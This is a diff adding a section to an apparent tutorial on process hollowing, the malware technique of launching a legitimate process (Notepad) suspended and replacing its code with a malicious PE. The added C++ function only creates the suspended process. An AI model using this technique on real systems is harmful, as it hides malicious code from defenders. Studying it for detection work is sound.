@@ -67,6 +67,37 @@ Starting with importing the necessary libraries :
 #include "pe.h"
 ```
 
+### Suspended Process Creation
+
+So as we said we should create a new instance of a legitimate process ( Notepade ) in a suspended state, why, because we should unmap its original code and replace it with our malicious one before the execution of its main thread.
+
+Let us create a function named ```CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)``` , The pSourceFile is our malicious code (PE).
+```cpp
+void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile){
+
+    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
+    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+    
+    CreateProcessA(
+        0,
+        pDestCmdLine,      
+        0, 
+        0, 
+        0, 
+        CREATE_SUSPENDED, 
+        0, 
+        0, 
+        pStartupInfo, 
+        pProcessInfo
+    );
+
+    if (!pProcessInfo->hProcess)
+    {
+        printf("Error creating process\r\n");
+        return;
+    }
+}
+```
 
 
 
